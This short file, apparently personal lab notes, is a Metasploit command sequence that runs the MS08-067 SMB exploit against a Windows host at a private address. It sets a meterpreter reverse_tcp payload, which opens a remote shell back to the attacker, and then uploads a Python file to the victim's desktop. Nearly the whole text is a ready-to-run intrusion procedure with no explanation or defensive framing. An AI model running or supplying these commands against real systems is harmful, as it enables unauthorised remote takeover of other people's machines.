# MetasploitExploit
```sh
sudo ifconfig eth0 up
sudo dhclient eth0

use exploit/windows/smb/ms08_067_netapi
set target 34
set payload windows/meterpreter/reverse_tcp
set RHOSTS 192.168.10.135
exploit

meterpreter > upload '/home/mika/D/tcpmaster_example.py' 'C:\\Documents and Settings\\xuegod_root\\桌面'
```
